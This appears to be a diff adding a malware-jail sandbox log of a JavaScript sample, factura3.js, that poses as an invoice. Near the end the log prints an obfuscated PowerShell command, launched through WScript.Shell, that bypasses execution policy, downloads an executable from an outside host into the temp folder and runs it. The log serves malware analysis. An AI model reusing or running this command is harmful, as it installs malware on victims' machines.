@@ -1,0 +1,40 @@
+10 Sep 00:20:51 - mailware-jail, a malware sandbox ver. 0.15
+10 Sep 00:20:51 - ------------------------
+10 Sep 00:20:51 - Arguments: /home/maik/gitHub/TFM/fame/storage/74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566/factura3.js
+10 Sep 00:20:51 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+10 Sep 00:20:51 - Malware files: /home/maik/gitHub/TFM/fame/storage/74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566/factura3.js
+10 Sep 00:20:51 - Execution timeout set to: 60 seconds
+10 Sep 00:20:51 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 00:20:51 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+10 Sep 00:20:51 - Download from remote server: No
+10 Sep 00:20:51 - ==> Preparing Sandbox environment.
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+10 Sep 00:20:51 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+10 Sep 00:20:51 - ==> Executing malware file(s). =========================================
+10 Sep 00:20:51 -  => Executing: /home/maik/gitHub/TFM/fame/storage/74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566/factura3.js verbosely, reporting silent catches
+10 Sep 00:20:51 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566_factura3.js
+10 Sep 00:20:51 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566_factura3.js
+10 Sep 00:20:51 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566/factura3.js'
+10 Sep 00:20:51 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/74f7e1ff69a4bd0debfc9c601ec3e30f4f31cdb68a61eace9c95d5afdb8e5566/factura3.js,xyz'
+10 Sep 00:20:51 - WScript.CreateObject(Scripting.FileSystemObject)
+10 Sep 00:20:51 - new Scripting.FileSystemObject[14]
+10 Sep 00:20:51 - new DriveObject[15](C:)
+10 Sep 00:20:51 - DriveObject[15](C:).name = (string) 'C:'
+10 Sep 00:20:51 - new Collection[16]
+10 Sep 00:20:51 - new Function(if(ekoxi.GetBaseName('C:') === '' && ekoxi.GetBaseName('C:').length == 0) return true; else return false;) => Function[17]
+10 Sep 00:20:51 - Calling Function[17]() on sandbox
+10 Sep 00:20:51 - Scripting.FileSystemObject[14].GetBaseName('C:') => 
+10 Sep 00:20:51 - Scripting.FileSystemObject[14].GetBaseName('C:') => 
+10 Sep 00:20:51 - Returning: 'true'
+10 Sep 00:20:51 - WScript.CreateObject(WScript.Shell)
+10 Sep 00:20:51 - new WScript.Shell[18]
+10 Sep 00:20:51 - WScript.Shell[18].Run(cmd.exe /c "powershell  $usij='Bypa';$aheho='$pat';$bopu='ct S';$guvcytc='.exe';$axnitz='ent)';$ahywm='New-';$ujuj='oces';$vpywniwt='nPol';$ogdipq='Exec';$awzagd='icy ';$tluto='axco';$jfyzwi='nica';$ywxiwm='Scop';$ylvif='''\qw';$srybcur=''');(';$jujxu='h); ';$arit='yste';$icimu='oces';$cebcy='Star';$jdixki='dFil';$afjikro='s $p';$ibgint='nv:t';$lqaveld='.Dow';$cbybqurc='ttp:';$awguzy='Obje';$ykary='e(''h';$kahi='//bi';$ybkat='jr'',';$qocudj='emp+';$aqbund='ss -';$awesx='Set-';$eqazpa='nloa';$icoh='t-Pr';$omgitu='l.co';$bafujp='bcli';$unhubp='utio';$inlohny='m.Ne';$wofsysv='et.t';$ymac='path';$awaz='m/le';$rojdoj='hcli';$tyzzi='ath';$vgygi='t.We';$sgaksunm='otec';$ofexq='e Pr';$nxera='s; $';$nixsub='=($e'; Invoke-Expression ($awesx+$ogdipq+$unhubp+$vpywniwt+$awzagd+$usij+$aqbund+$ywxiwm+$ofexq+$ujuj+$nxera+$ymac+$nixsub+$ibgint+$qocudj+$ylvif+$tluto+$guvcytc+$srybcur+$ahywm+$awguzy+$bopu+$arit+$inlohny+$vgygi+$bafujp+$axnitz+$lqaveld+$eqazpa+$jdixki+$ykary+$cbybqurc+$kahi+$sgaksunm+$rojdoj+$jfyzwi+$omgitu+$awaz+$wofsysv+$ybkat+$aheho+$jujxu+$cebcy+$icoh+$icimu+$afjikro+$tyzzi);", 0, undefined)
+10 Sep 00:20:51 - ==> Cleaning up sandbox.
+10 Sep 00:20:51 - ==> Script execution finished, dumping sandbox environment to a file.
+10 Sep 00:20:51 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
